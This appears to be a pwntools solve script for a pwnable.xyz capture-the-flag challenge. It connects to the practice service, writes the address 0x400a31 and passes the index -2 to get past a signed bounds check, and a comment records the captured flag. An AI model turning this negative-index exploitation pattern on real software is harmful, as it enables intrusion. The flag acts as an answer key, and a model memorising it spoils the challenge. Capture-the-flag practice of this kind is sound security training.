from pwn import *


""" r = process('./challenge') """
r = remote('svc.pwnable.xyz', 30007)
r.recvuntil('> ')
r.sendline('1')
r.recvuntil(': ')
r.sendline('0x400a31')
r.recvuntil('> ')
r.sendline('2')
r.recvuntil('> ')
r.sendline('-2')
l = r.recvline()
print(l)

# flag: FLAG{signed_comparison_checked}
